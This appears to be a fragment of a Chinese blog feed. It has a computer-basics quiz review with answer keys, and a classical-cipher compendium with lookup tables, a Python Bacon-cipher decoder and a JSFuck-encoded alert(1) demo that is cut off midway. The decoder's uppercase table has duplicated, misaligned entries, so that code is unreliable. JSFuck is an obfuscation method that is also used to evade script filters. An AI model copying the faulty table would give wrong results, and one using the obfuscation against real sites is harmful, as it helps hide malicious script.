id="查缺补漏"><a href="#查缺补漏" class="headerlink" title="查缺补漏"></a>查缺补漏</h2><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p>23、<strong>计算机的机器语言是与计算机硬件有关的语言。</strong> </p><p>  正确答案： 正确</p><p>24、计算机高级语言是与计算机硬件有关的语言。<br>正确答案： 错误</p><p><strong>25</strong>、计算机高级语言就是面向过程的语言。</p><p>正确答案： 错误        </p><p><strong>26</strong>、在计算机内,字是数据的最小存储单位。</p><p>正确答案： 错误            （Bit 比特/位，1个字节8位</p><p><strong>28</strong>、操作系统是直接运行在裸机之上的最基本的应用软件,系统软件必须在应用软件的支持下才能运行。</p><p>正确答案： 错误        </p><p><strong>30</strong>、计算机语言包括低级语言和高级语言两类。</p><p>正确答案： 正确    </p><p><strong>35</strong>、CAI的中文含义是计算机辅助设计。</p><p>正确答案： 错误             （  Computer-Assisted Instruction电脑辅助教学</p><p><strong>36</strong>、CAM的中文含义是计算机辅助制造。</p><p>正确答案： 正确</p><p><strong>37</strong>、计算机辅助制造是指利用计算机来帮助设计人员进行设计工作,如飞机、汽车、道路桥梁建筑、室内装潢设计、大规模集成电路制作等。</p><p>正确答案： 错误</p><p><strong>45</strong>、冯·诺依曼体系结构计算机的工作原理是自动运算。</p><p>正确答案： 错误   （<strong>冯·诺依曼体系结构计算机的工作原理是存储程序、程序控制。</strong>）</p><p><strong>11</strong>、十进制数化为二进制数的方法是( )。</p><p>A、 .除以2取余法 </p><p>B、 除以2取整法 </p><p>C、 乘2取整法 </p><p>D、 乘2取余法 </p><p>正确答案： AC        </p><p><strong>20、归纳起来,计算机的应用领域体现在以下几个方面。</strong></p><p>A、 数值计算 </p><p>B、 信息处理 </p><p>C、 过程控制 </p><p>D、 计算机辅助系统 </p><p>正确答案： ABCD</p><p><strong>23</strong>、以下属于计算机辅助系统的是( )。</p><p>A、 CAD  <strong>Computer Aided Design</strong>计算机辅助设计</p><p>B、 CAI  <strong>Computer Aided instruction</strong> 计算机辅助教学</p><p>C、 CAM <strong>Computer-aided manufacturing</strong>计算机辅助制造</p><p>D、 AI </p><p>正确答案： ABC        </p><h1 id="计算机辅助系统"><a href="#计算机辅助系统" class="headerlink" title="计算机辅助系统"></a>计算机辅助系统</h1><p>CAD  <strong>Computer Aided Design</strong>计算机辅助设计</p><p>CAI  <strong>Computer Aided instruction</strong> 计算机辅助教学</p><p>CAM <strong>Computer-aided manufacturing</strong>计算机辅助制造</p><h1 id="Raptor"><a href="#Raptor" class="headerlink" title="Raptor"></a>Raptor</h1><h2 id="R14-输入一个正整数，显示该数，然后再显示与其相反顺序的整数。比如1234567的相反顺序整数是7654321，123000的相反顺序整数是321。要求用循环结构实现。"><a href="#R14-输入一个正整数，显示该数，然后再显示与其相反顺序的整数。比如1234567的相反顺序整数是7654321，123000的相反顺序整数是321。要求用循环结构实现。" class="headerlink" title="R14.输入一个正整数，显示该数，然后再显示与其相反顺序的整数。比如1234567的相反顺序整数是7654321，123000的相反顺序整数是321。要求用循环结构实现。"></a>R14.<strong>输入一个正整数，显示该数，然后再显示与其相反顺序的整数。比如1234567的相反顺序整数是7654321，123000的相反顺序整数是321。要求用循环结构实现。</strong></h2><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><blockquote><p><img src="https://s2.loli.net/2021/12/12/G4RywrdI51Bh7Cl.png" alt="image-20211212091536570"></p></blockquote><h2 id="R12-产生并显示8个100到200之间的随机整数，并显示其中的最大数和最小数的差"><a href="#R12-产生并显示8个100到200之间的随机整数，并显示其中的最大数和最小数的差" class="headerlink" title="R12.产生并显示8个100到200之间的随机整数，并显示其中的最大数和最小数的差"></a>R12.产生并显示<strong>8</strong>个<strong>100</strong>到<strong>200</strong>之间的随机整数，<strong>并显示其中的最大数和最小数的差</strong></h2><h3 id="Key-数字与字符的拼接"><a href="#Key-数字与字符的拼接" class="headerlink" title="Key(数字与字符的拼接)"></a>Key(数字与字符的拼接)</h3><blockquote><p>MAXIMUM+” - “+MINIMUM+” = “+(MAXIMUM-MINIMUM)</p></blockquote><p>！ <strong>括号的不可丢失，（MAXIMUM+” - “+MINIMUM+” = “+(MAXIMUM-MINIMUM)）</strong></p><h2 id="R10-输入两个正整数m和n，计算并显示m和n的最大公约数。"><a href="#R10-输入两个正整数m和n，计算并显示m和n的最大公约数。" class="headerlink" title="R10.输入两个正整数m和n，计算并显示m和n的最大公约数。"></a>R10.输入两个正整数m和n，计算并显示m和n的最大公约数。</h2><h3 id="Key-最大公约数算法"><a href="#Key-最大公约数算法" class="headerlink" title="Key(最大公约数算法)"></a>Key(最大公约数算法)</h3><p><img src="https://s2.loli.net/2021/12/12/tmHAqjUfXP5VMbT.png" alt="image-20211212102033481"></p><h2 id="R9-已知一个有10个整数组成的数列，按升序排列并显示结果。要求整数数列用随机函数产生，范围是-10，210"><a href="#R9-已知一个有10个整数组成的数列，按升序排列并显示结果。要求整数数列用随机函数产生，范围是-10，210" class="headerlink" title="R9.已知一个有10个整数组成的数列，按升序排列并显示结果。要求整数数列用随机函数产生，范围是[10，210]"></a>R9.<strong>已知一个有10个整数组成的数列，按升序排列并显示结果。要求整数数列用随机函数产生，范围是[10，210]</strong></h2><h3 id="key-升序算法"><a href="#key-升序算法" class="headerlink" title="key(升序算法)"></a>key(升序算法)</h3><p><img src="https://s2.loli.net/2021/12/12/WtMdvpDEPjk8nK7.png" alt="image-20211212103536559"></p><h2 id="R8-在一个笼子里有若干只鸡和若干只兔，从上面数共有42个头，从下面数共有94只脚，编写程序求解鸡和兔各是多少只？"><a href="#R8-在一个笼子里有若干只鸡和若干只兔，从上面数共有42个头，从下面数共有94只脚，编写程序求解鸡和兔各是多少只？" class="headerlink" title="R8 在一个笼子里有若干只鸡和若干只兔，从上面数共有42个头，从下面数共有94只脚，编写程序求解鸡和兔各是多少只？"></a>R8 <strong>在一个笼子里有若干只鸡和若干只兔，从上面数共有42个头，从下面数共有94只脚，编写程序求解鸡和兔各是多少只？</strong></h2><h3 id="key-1"><a href="#key-1" class="headerlink" title="key"></a>key</h3><blockquote><p>遍历求解</p></blockquote><h2 id="R7"><a href="#R7" class="headerlink" title="R7"></a>R7</h2><blockquote><p><strong>显示如下图形。</strong></p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">     *</span></span><br><span class="line">    <span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">   <span class="strong">****</span>*</span></span></span><br><span class="line"><span class="strong">  **</span><span class="strong">****</span><span class="emphasis">*</span></span><br><span class="line"><span class="emphasis"> <span class="strong">****</span><span class="strong">****</span>*</span></span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br></pre></td></tr></table></figure><blockquote><p>要求用主图和<strong>prt(m,c)</strong>过程实现，该过程的功能是，显示<strong>m</strong>个字符<strong>c</strong></p></blockquote><h3 id="main（参数以及两次prt）"><a href="#main（参数以及两次prt）" class="headerlink" title="main（参数以及两次prt）"></a>main（参数以及两次prt）</h3><p><img src="https://s2.loli.net/2021/12/12/3TrvdtXIkK9FVge.png" alt="image-20211212113541671"></p><h2 id="11、显示100到150之间的所有素数。要求用主图和过程isp实现。过程isp-m-f-的功能是，判断整数m（m≥2）是否为素数，如果是素数，则f为true，否则f为false。"><a href="#11、显示100到150之间的所有素数。要求用主图和过程isp实现。过程isp-m-f-的功能是，判断整数m（m≥2）是否为素数，如果是素数，则f为true，否则f为false。" class="headerlink" title="11、显示100到150之间的所有素数。要求用主图和过程isp实现。过程isp(m,f)的功能是，判断整数m（m≥2）是否为素数，如果是素数，则f为true，否则f为false。"></a>11、显示100到150之间的所有素数。要求用主图和过程isp实现。过程isp(m,f)的功能是，判断整数m（m≥2）是否为素数，如果是素数，则f为true，否则f为false。</h2><h4 id="Key"><a href="#Key" class="headerlink" title="Key"></a>Key</h4><blockquote><p>等号！</p></blockquote><p><img src="https://s2.loli.net/2021/12/12/Wwncum7K8BAIXSh.png" alt="image-20211212123243680"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto·古典密码大全</title>
      <link href="/2021/12/09/Crypto%C2%B7%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%A4%A7%E5%85%A8/"/>
      <url>/2021/12/09/Crypto%C2%B7%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceYQrX0duHSPjq3EHbtX8hDT.MDZx8peGfuFb1r6E1fU.WuXnIYGaJ6AGDGKOzjSaieKzvcQhB6Lm4kt29XqT4Y!/b&bo=gAe8AgAAAAABFwk!&rf=viewer_4" alt="title"></p><h1 id="1-埃及文字"><a href="#1-埃及文字" class="headerlink" title="1.埃及文字"></a>1.埃及文字</h1><h2 id="·加-解密方式：对表"><a href="#·加-解密方式：对表" class="headerlink" title="·加/解密方式：对表"></a>·加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceNY61tDJSZrVkG8mbvOZpJqMQNFEZTz3dMzBJcT.NKzTJDkj2CXZP1jaj6SKV3Y.BO.2CaByaxN8j5vh5onbow!/b&bo=NANPAQAAAAADF0s!&rf=viewer_4" alt="埃及文字"></p><h1 id="2-宝可梦图腾"><a href="#2-宝可梦图腾" class="headerlink" title="2.宝可梦图腾"></a>2.宝可梦图腾</h1><h2 id="·加-解密方式：对表-1"><a href="#·加-解密方式：对表-1" class="headerlink" title="·加/解密方式：对表"></a>·加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceNY61tDJSZrVkG8mbvOZpJxwsEmYmOOnOUuavtLtnCdBf75aGODfL0Fy7hFAgjZLhAQj*cNkOSWfqwq1ieNHW4!/b&bo=jQN1AgAAAAADN.s!&rf=viewer_4" alt="bkm"></p><h1 id="3-福尔摩斯·跳舞的小人"><a href="#3-福尔摩斯·跳舞的小人" class="headerlink" title="3.福尔摩斯·跳舞的小人"></a>3.福尔摩斯·跳舞的小人</h1><h2 id="·加-解密方式：对表-2"><a href="#·加-解密方式：对表-2" class="headerlink" title="·加/解密方式：对表"></a>·加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceNY61tDJSZrVkG8mbvOZpJGMc.AnnodWjNUwsytdw2fl0niyHwthF49U9ovdS9xBLJ77oi9JL1cJ4N97uOjJHE!/b&bo=OARkBgAAAAADJ1w!&rf=viewer_4" alt="fems"></p><h1 id="4-精灵语"><a href="#4-精灵语" class="headerlink" title="4.精灵语"></a>4.精灵语</h1><h2 id="·加-解密方式：对表-3"><a href="#·加-解密方式：对表-3" class="headerlink" title="·加/解密方式：对表"></a>·加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceNY61tDJSZrVkG8mbvOZpJQHFygZOIgqCNXrjz.sc3enZHz4LVirtvqCY6FmJcg*M*IFH7Qr4.IPO1NBT*GEfg!/b&bo=iQKYAQAAAAADFyA!&rf=viewer_4" alt="jly"></p><h1 id="5-盲文"><a href="#5-盲文" class="headerlink" title="5.盲文"></a>5.盲文</h1><h2 id="·加-解密方式：对表-4"><a href="#·加-解密方式：对表-4" class="headerlink" title="·加/解密方式：对表"></a>·加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcVdOfDotz4rC03MEkgC1wx.oDoOTD*54TOp6BhzjaD1MjRxWne7plM2VibGQyYFSaFNCM2MVQneXkwJY4Q6pXSU!/b&bo=8wESAQAAAAADF9M!&rf=viewer_4" alt="mw"></p><h1 id="6-曲折密码-夏多密码"><a href="#6-曲折密码-夏多密码" class="headerlink" title="6.曲折密码/夏多密码"></a>6.<a href="https://tieba.baidu.com/p/3673080778">曲折密码/夏多密码</a></h1><h2 id="·-加-解密方式：对表"><a href="#·-加-解密方式：对表" class="headerlink" title="· 加/解密方式：对表"></a>· 加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcUrRQo*.8wP1Z3cw8so21VvBCbwQW*Xm3hKZ0AdyXS*gixfktQIS7Z6..TK1zUiHTnTC881EdvzC1BrTN7IHteA!/b&bo=ewL1BQAAAAABF7k!&rf=viewer_4" alt="qz"></p><h1 id="7-圣堂武士密码"><a href="#7-圣堂武士密码" class="headerlink" title="7.圣堂武士密码"></a>7.圣堂武士密码</h1><h2 id="·-加-解密方式：对表-1"><a href="#·-加-解密方式：对表-1" class="headerlink" title="· 加/解密方式：对表"></a>· 加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcVdOfDotz4rC03MEkgC1wx8Yp97l90WxWPxQI6zEmrBzQqe9QSAyhPIiX29qgSkVrwl3m.zJr8FCHXS3LSC2Iqw!/b&bo=XALJAQAAAAADF6Q!&rf=viewer_4" alt="st"></p><span id="more"></span><h1 id="8-外星人密码"><a href="#8-外星人密码" class="headerlink" title="8.外星人密码"></a>8.外星人密码</h1><h2 id="·-加-解密方式：对表-2"><a href="#·-加-解密方式：对表-2" class="headerlink" title="· 加/解密方式：对表"></a>· 加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcVdOfDotz4rC03MEkgC1wx9L4qbqqW6hnpt5SOb.usm4dZBPipgRPyvR24ipC.xFPIJbpSkf4E45hwszyV2nft8!/b&bo=5AJYAgAAAAADF44!&rf=viewer_4" alt="wsr"></p><h1 id="9-音乐密码"><a href="#9-音乐密码" class="headerlink" title="9.音乐密码"></a>9.音乐密码</h1><h2 id="·-加-解密方式：对表-3"><a href="#·-加-解密方式：对表-3" class="headerlink" title="· 加/解密方式：对表"></a>· 加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcU6GpM.OKIA1SaQyC8eAgkb94HT3wIfThPacK8jmwbv2LfIWf75scwzTNkBcjQqtiryv8n4UB322NqjwRaKNZSQ!/b&bo=sgKXAwAAAAADV1Y!&rf=viewer_4" alt="music"></p><h1 id="10-银河标准字母"><a href="#10-银河标准字母" class="headerlink" title="10.银河标准字母"></a>10.银河标准字母</h1><h2 id="·-加-解密方式：对表-4"><a href="#·-加-解密方式：对表-4" class="headerlink" title="· 加/解密方式：对表"></a>· 加/解密方式：对表</h2><p><img src="http://tiebapic.baidu.com/forum/w%3D580/sign=ca89487664f082022d9291377bfafb8a/5de47351f3deb48feb960d8be71f3a292cf57883.jpg" alt="yinhe"></p><h1 id="11-猪圈密码"><a href="#11-猪圈密码" class="headerlink" title="11.猪圈密码"></a>11.猪圈密码</h1><h2 id="·-加-解密方式：对表-5"><a href="#·-加-解密方式：对表-5" class="headerlink" title="· 加/解密方式：对表"></a>· 加/解密方式：对表</h2><p><img src="https://images2018.cnblogs.com/blog/1077058/201711/1077058-20171125235744000-510682495.jpg" alt="zhu1"><br><img src="https://images2018.cnblogs.com/blog/1077058/201711/1077058-20171125235726234-474414381.jpg" alt="zhu2"></p><h1 id="12-猪圈密码变种"><a href="#12-猪圈密码变种" class="headerlink" title="12.猪圈密码变种"></a>12.猪圈密码变种</h1><h2 id="·-加-解密方式：对表-6"><a href="#·-加-解密方式：对表-6" class="headerlink" title="· 加/解密方式：对表"></a>· 加/解密方式：对表</h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcaXap4viKFFNnx*fjvPwUgot20VH.1uFpPQqzajgh0jev5TCzJ1OuEWI6LXfrux3TY0GfNKCjRruKAenSAPAJP8!/b&bo=OgKXAQAAAAADF5w!&rf=viewer_4" alt="zb"></p><h1 id="13-天干地支表"><a href="#13-天干地支表" class="headerlink" title="13.天干地支表"></a>13.天干地支表</h1><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcfbCBsWCBG*gpIKxvz00JLKjouxpi2Lw8dukCHetuR8iUGgG4co6*w1p1SZml6Nlj1MdJBWWh1dfjozJsC3bejI!/b&bo=XgIhAgAAAAADN20!&rf=viewer_4" alt="ok"></p><h1 id="14-莫斯密码"><a href="#14-莫斯密码" class="headerlink" title="14.莫斯密码"></a>14.莫斯密码</h1><h2 id="·-加-解密方式：对表-｜-网站解析"><a href="#·-加-解密方式：对表-｜-网站解析" class="headerlink" title="· 加/解密方式：对表 ｜ 网站解析"></a>· 加/解密方式：对表 ｜ <a href="http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx">网站解析</a></h2><p><img src="https://img-blog.csdnimg.cn/20210403092716918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0Mzk4NTE5,size_16,color_FFFFFF,t_70" alt="mose"></p><h1 id="15-培根密码"><a href="#15-培根密码" class="headerlink" title="15.培根密码"></a>15.培根密码</h1><h2 id="·-加-解密方式：对表-7"><a href="#·-加-解密方式：对表-7" class="headerlink" title="· 加/解密方式：对表"></a>· 加/解密方式：对表</h2><p><img src="https://img-blog.csdnimg.cn/20210403092758485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0Mzk4NTE5,size_16,color_FFFFFF,t_70" alt="pekon"></p><h2 id="·-加-解密方式：Python3代码实现"><a href="#·-加-解密方式：Python3代码实现" class="headerlink" title="· 加/解密方式：Python3代码实现"></a>· 加/解密方式：Python3代码实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__autor__ = <span class="string">&#x27;0HB&#x27;</span></span><br><span class="line">letters1 = [</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">letters2 = [</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">cipher1 = [</span><br><span class="line">    <span class="string">&quot;aaaaa&quot;</span>, <span class="string">&quot;aaaab&quot;</span>, <span class="string">&quot;aaaba&quot;</span>, <span class="string">&quot;aaabb&quot;</span>, <span class="string">&quot;aabaa&quot;</span>, <span class="string">&quot;aabab&quot;</span>, <span class="string">&quot;aabba&quot;</span>,</span><br><span class="line">    <span class="string">&quot;aabbb&quot;</span>, <span class="string">&quot;abaaa&quot;</span>, <span class="string">&quot;abaab&quot;</span>, <span class="string">&quot;ababa&quot;</span>, <span class="string">&quot;ababb&quot;</span>, <span class="string">&quot;abbaa&quot;</span>, <span class="string">&quot;abbab&quot;</span>,</span><br><span class="line">    <span class="string">&quot;abbba&quot;</span>, <span class="string">&quot;abbbb&quot;</span>, <span class="string">&quot;baaaa&quot;</span>, <span class="string">&quot;baaab&quot;</span>, <span class="string">&quot;baaba&quot;</span>, <span class="string">&quot;baabb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;babaa&quot;</span>, <span class="string">&quot;babab&quot;</span>, <span class="string">&quot;babba&quot;</span>, <span class="string">&quot;babbb&quot;</span>, <span class="string">&quot;bbaaa&quot;</span>, <span class="string">&quot;bbaab&quot;</span>,</span><br><span class="line">]</span><br><span class="line">cipher2 = [</span><br><span class="line">    <span class="string">&quot;AAAAA&quot;</span>, <span class="string">&quot;AAAAB&quot;</span>, <span class="string">&quot;AAABA&quot;</span>, <span class="string">&quot;AAABB&quot;</span>, <span class="string">&quot;AABAA&quot;</span>, <span class="string">&quot;AABAB&quot;</span>, <span class="string">&quot;AABBA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;AABBB&quot;</span>, <span class="string">&quot;ABAAA&quot;</span>, <span class="string">&quot;ABAAA&quot;</span>, <span class="string">&quot;ABAAB&quot;</span>, <span class="string">&quot;ABABA&quot;</span>, <span class="string">&quot;ABABB&quot;</span>, <span class="string">&quot;ABBAA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ABBAB&quot;</span>, <span class="string">&quot;ABBBA&quot;</span>, <span class="string">&quot;ABBBB&quot;</span>, <span class="string">&quot;BAAAA&quot;</span>, <span class="string">&quot;BAAAB&quot;</span>, <span class="string">&quot;BAABA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BAABB&quot;</span>, <span class="string">&quot;BAABB&quot;</span>, <span class="string">&quot;BABAA&quot;</span>, <span class="string">&quot;BABAB&quot;</span>, <span class="string">&quot;BABBA&quot;</span>, <span class="string">&quot;BABBB&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bacon1</span>(<span class="params">string</span>):</span>  <span class="comment"># 对应小写密文</span></span><br><span class="line">    lists = []</span><br><span class="line">    <span class="comment"># 分割，五个一组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string), <span class="number">5</span>):</span><br><span class="line">        lists.append(string[i:i + <span class="number">5</span>])</span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    <span class="comment"># 循环匹配，得到下标，对应下标即可</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lists)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> lists[i] == cipher1[j]:</span><br><span class="line">                <span class="comment"># print(j)</span></span><br><span class="line">                <span class="built_in">print</span>(letters1[j], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bacon2</span>(<span class="params">string</span>):</span>  <span class="comment"># 对应大写密文</span></span><br><span class="line">    lists = []</span><br><span class="line">    <span class="comment"># 分割，五个一组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string), <span class="number">5</span>):</span><br><span class="line">        lists.append(string[i:i + <span class="number">5</span>])</span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    <span class="comment"># 循环匹配，得到下标，对应下标即可</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lists)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> lists[i] == cipher2[j]:</span><br><span class="line">                <span class="comment"># print(j)</span></span><br><span class="line">                <span class="built_in">print</span>(letters2[j], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    c = <span class="built_in">input</span>(<span class="string">&#x27;请输入培根密文：&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> c.isupper():</span><br><span class="line">        bacon2(c)</span><br><span class="line">    <span class="keyword">elif</span> c.islower():</span><br><span class="line">        bacon1(c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;输入错误，请检查！&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="16-JSfuck密码"><a href="#16-JSfuck密码" class="headerlink" title="16.JSfuck密码"></a>16.JSfuck密码</h1><h2 id="·简介"><a href="#·简介" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>·JSFuck 可以让你只用 6 个字符 !+ 来编写 JavaScript 程序。</p><p>·例如你想用 JSFuck 来实现 alert(1) 代码如下：</p></blockquote><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][[]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]]]]+(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]]]]+(<span class="name">!!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">+!+</span>[]]]]][([][(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name"><span class="builtin-name">+</span></span>[]]]]+([][[]]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span class="name">!+</span>[]+!+[]+!+[]+!+[]+!+[]]]]+(<span class="name">!</span>[]+[])[<span class="name"><span class="builtin-name">+</span></span>[[<span 